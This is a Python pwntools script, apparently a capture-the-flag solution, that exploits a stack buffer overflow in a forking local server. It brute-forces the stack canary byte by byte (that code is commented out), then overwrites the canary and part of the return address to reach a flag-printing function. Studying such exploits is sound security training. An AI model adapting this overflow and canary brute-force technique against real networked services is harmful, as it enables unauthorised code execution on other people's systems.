'''
While canaries are enabled, this networked program forks.
What is important to note is that the canary does not get re-randomized on fork.

When data that you are overflowing into is critical (i.e., if you screw it up
the program crashes), but also static across executions, you can brute-force
it byte by byte over many attempts.
'''

from pwn import *

host, port = "localhost", 1337
#context.log_level = "debug"

oracle = b"### Goodbye!"

# def brute_force():

#     canary = b""
#     padding = b"A" * 0x78

#     while len(canary) != 8:
#         for i in range(0x100):
#             p = remote(host, port)
#             payload = padding + canary + bytes([i])
#             size = len(payload)
#             p.sendlineafter(b"size:", str(size).encode())
#             p.sendafter(b"!", payload)

#             result = p.recvlines(3)
#             if oracle in result:
#                 print(f"Found: {hex(i)} at index: {len(canary)}")
#                 canary += bytes([i])
#                 print(canary)
#                 break

#             p.close()

#     return u64(canary)

def exploit(canary):
    offset = 0x78

    for i in range(0,16):
        p = remote(host, port)
        #lsb = str(i) + "0c6"
        #write = int(lsb, 16)
        addr = i * 0x1000 + 0xd6b
        payload = b"A" * offset + p64(canary) + b"B"*8 + p16(addr)
        p.sendlineafter(b"size:", str(len(payload)).encode())
        p.sendafter(b"!", payload)
        try:
            p.recvuntil(b"flag:\n")
            data = p.recvline()
            print(data)
        except EOFError:
            p.close()

canary = 0xd7f85cd4e635ca00
exploit(canary)
